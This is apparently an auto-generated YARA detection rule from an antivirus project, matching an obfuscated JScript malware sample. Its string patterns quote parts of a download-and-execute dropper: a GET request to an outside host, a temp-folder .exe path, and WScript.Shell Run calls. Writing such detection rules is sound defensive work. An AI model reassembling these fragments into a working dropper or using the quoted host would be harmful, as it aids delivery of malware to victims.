rule sig_20160328_f7b7d89ee2f3bfa10c5d7fcae9b5c76a {
  meta:
    description = "datamaliciousorder - file 20160328_f7b7d89ee2f3bfa10c5d7fcae9b5c76a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2242270a2ca6b5eb97485d95fa38c0c92525380aaccc6ce06c094d7e482a94e4"

  strings:
    $s1  = "function Jvoydzdmjt() {return Kprlki[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"m2EnCrS79R5J.exe\";};" fullword ascii
    $s2  = "Uphamxfw[Jluleejxa](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Aferjtm](Dwkizbx() * 11)} while (Uphamxfw[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Qjteghoupf(Geynfsky, Cpzdn){return Geynfsky - Cpzdn;};" fullword ascii
    $s5  = "var Kprlki = function Pzwump() {return WScript[Cpfhnyd](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Fpxgofwd() {return ((Cwtpxbp == true) && (Cwtpxbp == Jckpihp)) ? 1 : Xcbfbvierq;};" fullword ascii
    $s7  = "function Ypirneayzo(Kxhvoflgq){Kprlki[\"Run\"](Kxhvoflgq, Xcbfbvierq, Xcbfbvierq);};" fullword ascii
    $s8  = "function Zcbmg()" fullword ascii
    $s9  = "function Jtpgaembr(){return Cpfhnyd;};" fullword ascii
    $s10 = "var Cwtpxbp = false;" fullword ascii
    $s11 = " while (Bjjpcv){" fullword ascii
    $s12 = "var Ygzne = new this[\"Date\"]();" fullword ascii
    $s13 = "function Kgopiow(Quxvfnqof) {var Xwgvydoab = (1, 2, 3, 4, 5, Quxvfnqof); return Xwgvydoab;};" fullword ascii
    $s14 = "function Dwkizbx(){return 22;};" fullword ascii
    $s15 = "var Qnccbpthx = false;" fullword ascii
    $s16 = "Cwtpxbp = true; " fullword ascii
    $s17 = "return Qjteghoupf(Psoep, Jayltuwk);" fullword ascii
    $s18 = "var Jckpihp = false;" fullword ascii
    $s19 = "Jckpihp = true; " fullword ascii
    $s20 = "function Llmypfvs(){return Cpvrndggv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}